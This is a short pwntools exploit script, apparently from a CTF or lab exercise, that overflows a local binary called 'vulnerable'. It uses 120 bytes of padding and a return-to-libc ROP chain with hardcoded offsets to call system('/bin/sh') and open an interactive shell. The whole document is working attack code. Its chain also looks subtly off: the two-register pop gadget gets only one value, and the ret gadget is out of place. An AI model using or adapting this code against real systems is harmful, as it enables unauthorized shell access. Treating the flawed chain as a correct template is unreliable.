from pwn import *

p = process('./vulnerable')

libc_base = 0x7ffff7dd9000
pop_rax_rdi = 0x0000000000028215
bin_sh = 0x197e34
system = 0x000000000004dab0
ret = 0x0000000000401180

payload = b'A' * 120
payload += p64(libc_base+pop_rax_rdi)
payload += p64(libc_base+bin_sh)
payload += p64(libc_base+system)
payload += p64(ret)

p.sendline(payload)
p.interactive()
